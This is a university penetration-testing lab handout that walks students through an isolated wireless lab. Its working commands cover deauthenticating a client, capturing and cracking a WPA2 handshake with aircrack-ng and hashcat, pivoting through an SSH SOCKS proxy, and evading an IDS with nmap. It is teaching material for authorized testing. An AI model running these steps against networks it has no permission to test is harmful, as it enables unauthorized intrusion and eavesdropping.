# Lab: Module 10 — Wireless and Network Penetration Testing

## Course: CIS-4333 Penetration Testing

## Texas Wesleyan University | Professor Nash

**Certification Alignment:** CompTIA PenTest+ (PT0-002)

---

## Lab Authorization Statement

**CRITICAL:** This lab is conducted exclusively in an isolated, professor-controlled wireless lab environment. The access points used in this lab are dedicated lab equipment with no connection to any production network, the university network, or the internet. Students must complete and submit the Lab Authorization Form before beginning.

Attempting any technique in this lab against any network other than the designated lab access points is a violation of university policy, federal law (18 U.S.C. § 1030, 18 U.S.C. § 2511), and state law. Any student found testing outside the authorized environment will receive a failing grade and be referred for disciplinary action.

---

## Lab Overview

- **Duration:** 3 hours
- **Environment:** Isolated wireless lab (VLAN 99, no external routing)
- **Equipment:** Kali Linux VM, USB wireless adapter (Alfa AWUS036ACH or equivalent), lab AP (WPA2-Personal pre-configured)
- **Lab AP SSID:** TXWES-LAB-10 (provided by instructor)
- **Lab AP Passphrase:** Provided at lab start — intentionally weak for cracking exercise
- **Authorized Client:** Raspberry Pi client device (instructor-controlled)

---

## Lab Objectives

By completing this lab, students will:

1. Configure a wireless adapter for monitor mode using Aircrack-ng tools.
2. Conduct passive wireless reconnaissance with Airodump-ng.
3. Capture a WPA2 four-way handshake using Aireplay-ng deauthentication.
4. Crack a WPA2-Personal passphrase using Aircrack-ng and Hashcat.
5. Demonstrate SSH dynamic port forwarding for network pivoting.
6. Apply Nmap evasion flags and document detection results.

---

## Part 1: Wireless Adapter Configuration (30 minutes)

### Step 1.1: Verify Adapter Detection

Connect the USB wireless adapter to your Kali Linux VM. Confirm it is recognized:

```bash
lsusb
iwconfig
```

You should see your adapter listed. Common interface names include wlan0 or wlan1.

### Step 1.2: Check Monitor Mode Support

```bash
iw list | grep -A 10 "Supported interface modes"
```

Confirm "monitor" appears in the supported modes list.

### Step 1.3: Kill Interfering Processes

```bash
sudo airmon-ng check kill
```

This terminates NetworkManager and wpa_supplicant processes that conflict with monitor mode. Note any processes killed.

**Lab Report Item 1:** List all processes killed by airmon-ng check kill. Why must these be terminated before enabling monitor mode?

### Step 1.4: Enable Monitor Mode

```bash
sudo airmon-ng start wlan0
iwconfig
```

Confirm the new monitor mode interface (wlan0mon) appears with mode "Monitor".

---

## Part 2: Passive Wireless Reconnaissance (30 minutes)

### Step 2.1: Survey Available Networks

```bash
sudo airodump-ng wlan0mon
```

Allow the scan to run for 60 seconds. Record the following in your lab report:

- BSSID of TXWES-LAB-10
- Channel
- Encryption type (ENC column)
- Cipher (CIPHER column)
- Authentication method (AUTH column)
- Any connected clients (shown in the lower section)

**Lab Report Item 2:** Create a table documenting all visible access points. Note which appear to be the authorized lab AP versus any incidental surrounding signals. Why is it important to document all visible APs even when targeting a specific one?

### Step 2.2: Focused Capture

Stop the broad scan (Ctrl-C). Begin a focused capture on the lab AP:

```bash
sudo airodump-ng --bssid [LAB_AP_BSSID] --channel [CHANNEL] --write lab10_capture wlan0mon
```

Leave this running in a terminal window. Open a second terminal for the next steps.

---

## Part 3: Handshake Capture (30 minutes)

### Step 3.1: Monitor for Natural Association

Watch the airodump-ng output in the first terminal. When the Raspberry Pi client connects naturally (instructor will trigger this), you will see "WPA handshake: [BSSID]" in the upper right corner of the display.

**Lab Report Item 3:** Screenshot the airodump-ng output showing the handshake capture notification.

### Step 3.2: Authorized Deauthentication (Instructor Supervised)

With instructor supervision and explicit permission, send a deauthentication frame to force reconnection. This step requires instructor sign-off.

In the second terminal, with instructor authorization confirmed:

```bash
sudo aireplay-ng --deauth 3 -a [LAB_AP_BSSID] -c [CLIENT_MAC] wlan0mon
```

Observe the airodump-ng window. The client will disconnect briefly and reconnect, and the handshake notification will appear.

**Lab Report Item 4:** Explain why deauthentication attacks are possible in WPA2. What standard addresses this vulnerability, and what is the name of the protection mechanism it provides?

### Step 3.3: Verify Capture

Stop the airodump-ng capture. Verify the handshake was captured:

```bash
aircrack-ng lab10_capture-01.cap
```

You should see "1 handshake" listed for the TXWES-LAB-10 network.

---

## Part 4: WPA2 Passphrase Cracking (45 minutes)

### Step 4.1: Dictionary Attack with Aircrack-ng

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [LAB_AP_BSSID] lab10_capture-01.cap
```

Record the time taken and whether the passphrase was found.

**Lab Report Item 5:** Was the passphrase in the rockyou.txt wordlist? Record the passphrase recovered. What does this result tell you about the security of the network? What CVSS score range would you assign to this finding?

### Step 4.2: Hashcat GPU-Accelerated Cracking

Convert the capture to Hashcat format:

```bash
hcxpcapngtool -o lab10_hash.hc22000 lab10_capture-01.cap
```

Run Hashcat (if GPU is available in the lab environment):

```bash
hashcat -m 22000 lab10_hash.hc22000 /usr/share/wordlists/rockyou.txt --status
```

**Lab Report Item 6:** Compare the performance (candidates per second) between Aircrack-ng and Hashcat. What factors explain the difference?

### Step 4.3: Rule-Based Attack

```bash
hashcat -m 22000 lab10_hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --status
```

**Lab Report Item 7:** What is the purpose of rule-based attacks? Give two examples of transformations the best64 rule set applies to base words.

---

## Part 5: Network Pivoting (30 minutes)

This section uses the lab's internal network. The instructor has pre-configured a pivot host (jump box) accessible via the wireless lab network.

**Pivot host IP:** 10.99.1.10 (wireless lab network)

**Target subnet:** 10.99.2.0/24 (not directly reachable from your Kali VM)

### Step 5.1: Establish SSH Dynamic Port Forwarding

```bash
ssh -D 1080 -N -f labuser@10.99.1.10
```

Password provided by instructor. The `-f` flag backgrounds the SSH process.

Verify the SOCKS proxy is listening:

```bash
ss -tlnp | grep 1080
```

### Step 5.2: Scan Through the Pivot

Configure proxychains to use the SOCKS proxy:

```bash
sudo nano /etc/proxychains4.conf
# Verify or add: socks5 127.0.0.1 1080
```

Scan the target subnet through the pivot:

```bash
proxychains nmap -sT -p 22,80,443,3389 10.99.2.0/24 2>/dev/null
```

**Lab Report Item 8:** Document the hosts discovered in the 10.99.2.0/24 subnet. Draw a network diagram showing your attack path from Kali → pivot host → target hosts.

---

## Part 6: Nmap Evasion Documentation (15 minutes)

The lab network includes a simulated IDS (Snort) logging traffic to a shared display visible to all students.

### Step 6.1: Standard Scan (Baseline)

```bash
nmap -sV 10.99.1.10
```

Observe the IDS alerts generated. Screenshot the alert console.

### Step 6.2: Fragmented Scan

```bash
nmap -f -sV 10.99.1.10
```

Compare alerts generated versus the standard scan.

### Step 6.3: Timing Evasion

```bash
nmap -T1 -sV 10.99.1.10
```

Note the scan duration and any alerts.

**Lab Report Item 9:** Create a comparison table: Scan Type | Alerts Generated | Scan Duration | Notes. Which technique was most effective at reducing IDS alerts while still completing the scan?

---

## Lab Report Submission

Your lab report must include:

- All nine Lab Report Items with screenshots where specified
- A completed wireless assessment findings table (SSID, BSSID, encryption, vulnerabilities found, CVSS score, remediation recommendation)
- Network pivot diagram
- Evasion comparison table
- 150-word reflection: What was the most significant security finding from today's lab, and what remediation would you recommend to a client?

**Submission:** Canvas, PDF format, due one week from lab date.

---

## Cleanup Procedures

Before ending the lab session:

1. Restore the wireless interface to managed mode: `sudo airmon-ng stop wlan0mon`
2. Restart NetworkManager: `sudo systemctl start NetworkManager`
3. Remove any temporary capture files from shared lab storage
4. Confirm SSH pivot session is terminated: `pkill ssh`
5. Complete the Lab Completion Checklist provided by the instructor

---

## Grading Rubric

| Component | Points |
|-----------|--------|
| Lab Report Items 1–9 complete with screenshots | 45 |
| Wireless findings table with CVSS scores | 20 |
| Network pivot diagram | 15 |
| Evasion comparison table | 10 |
| Written reflection | 10 |
| **Total** | **100** |
